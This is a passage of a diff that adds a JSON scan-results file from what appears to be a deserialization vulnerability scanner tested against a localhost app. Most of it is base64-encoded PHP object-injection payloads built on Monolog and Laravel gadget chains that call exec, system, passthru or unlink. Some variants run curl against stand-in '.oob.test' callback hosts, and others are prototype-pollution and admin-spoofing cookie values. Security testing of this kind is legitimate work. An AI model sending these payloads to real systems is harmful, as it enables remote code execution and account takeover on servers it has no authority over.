+          "payload": "{\"theme\": \"dark\", \"lang\": \"en\", \"__proto__\": {\"isAdmin\": true, \"polluted\": true}}",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8088/dashboard.html",
+      "method": "GET",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 2,
+      "oob_token": "3bc8ad1a2de7",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "static-only",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 18,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovLzNiYzhhZDFhMmRlNy5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo2OiJzeXN0ZW0iO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovLzNiYzhhZDFhMmRlNy5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo0OiJleGVjIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovLzNiYzhhZDFhMmRlNy5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo4OiJwYXNzdGhydSI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjM0OiJjdXJsIGh0dHA6Ly8zYmM4YWQxYTJkZTcub29iLnRlc3QvIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czozNDoiY3VybCBodHRwOi8vM2JjOGFkMWEyZGU3Lm9vYi50ZXN0LyI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6MzQ6ImN1cmwgaHR0cDovLzNiYzhhZDFhMmRlNy5vb2IudGVzdC8iO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8088/profile.html",
+      "method": "GET",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 1,
+      "oob_token": "34e2350235b3",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
+      "evidence": "static-only",
+      "notes": "Identity fields found: ['name'] | Try changing username/email to another user | Native PHP serialized object (unserialize() on untrusted input, CWE-502) — RCE-capable if the app has a POP gadget chain (phpggc) or a class with a dangerous __wakeup/__destruct; examine source for injectable classes",
+      "normalized": [
+        "O:3:\"Tag\":1:{s:4:\"name\";s:7:\"organic\";}"
+      ],
+      "mutations_count": 18,
+      "indicators": [],
+      "attempts": [
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czoxMzoiYWRtaW5pc3RyYXRvciI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo1OiJhZG1pbiI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo0OiJyb290Ijt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "modify_string",
+          "chain": null,
+          "payload": "TzozOiJUYWciOjE6e3M6NDoibmFtZSI7czo5OiJzdXBlcnVzZXIiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NDoiZXhlYyI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6ODoicGFzc3RocnUiO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6NjoidW5saW5rIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6Njoid2hvYW1pIjtzOjU6ImxldmVsIjtOO319czo4OiIAKgBsZXZlbCI7TjtzOjE0OiIAKgBpbml0aWFsaXplZCI7YjoxO3M6MTQ6IgAqAGJ1ZmZlckxpbWl0IjtpOi0xO3M6MTM6IgAqAHByb2Nlc3NvcnMiO2E6Mjp7aTowO3M6NzoiY3VycmVudCI7aToxO3M6Njoic3lzdGVtIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czo2OiJ3aG9hbWkiO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6Njoid2hvYW1pIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InVubGluayI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjY6Indob2FtaSI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovLzM0ZTIzNTAyMzViMy5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo2OiJzeXN0ZW0iO319fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovLzM0ZTIzNTAyMzViMy5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo0OiJleGVjIjt9fX0=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Monolog/RCE1",
+          "payload": "TzozMjoiTW9ub2xvZ1xIYW5kbGVyXFN5c2xvZ1VkcEhhbmRsZXIiOjE6e3M6OToiACoAc29ja2V0IjtPOjI5OiJNb25vbG9nXEhhbmRsZXJcQnVmZmVySGFuZGxlciI6Nzp7czoxMDoiACoAaGFuZGxlciI7cjoyO3M6MTM6IgAqAGJ1ZmZlclNpemUiO2k6LTE7czo5OiIAKgBidWZmZXIiO2E6MTp7aTowO2E6Mjp7aTowO3M6MzQ6ImN1cmwgaHR0cDovLzM0ZTIzNTAyMzViMy5vb2IudGVzdC8iO3M6NToibGV2ZWwiO047fX1zOjg6IgAqAGxldmVsIjtOO3M6MTQ6IgAqAGluaXRpYWxpemVkIjtiOjE7czoxNDoiACoAYnVmZmVyTGltaXQiO2k6LTE7czoxMzoiACoAcHJvY2Vzc29ycyI7YToyOntpOjA7czo3OiJjdXJyZW50IjtpOjE7czo4OiJwYXNzdGhydSI7fX19",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjM0OiJjdXJsIGh0dHA6Ly8zNGUyMzUwMjM1YjMub29iLnRlc3QvIjt9",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjQ6ImV4ZWMiO319czo4OiIAKgBldmVudCI7czozNDoiY3VybCBodHRwOi8vMzRlMjM1MDIzNWIzLm9vYi50ZXN0LyI7fQ==",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        },
+        {
+          "payload_type": "php_object_oob",
+          "chain": "Laravel/RCE1",
+          "payload": "Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjg6InBhc3N0aHJ1Ijt9fXM6ODoiACoAZXZlbnQiO3M6MzQ6ImN1cmwgaHR0cDovLzM0ZTIzNTAyMzViMy5vb2IudGVzdC8iO30=",
+          "skipped": true,
+          "reason": "Request failed: <urlopen error [Errno 111] Connection refused>",
+          "signal": "skipped"
+        }
+      ]
+    },
+    {
+      "url": "http://localhost:8088/login.html",
+      "method": "GET",
+      "location": "cookie",
+      "name": "ref_tag",
+      "occurrences": 1,
+      "oob_token": "88ca3125c5c7",
+      "type": "PHP",
+      "subtype": null,
+      "confidence": "High",
+      "exploit_type": "Identity Spoofing",
+      "suggested_probe": "modify_string",
+      "severity": "High",
+      "severity_note": null,
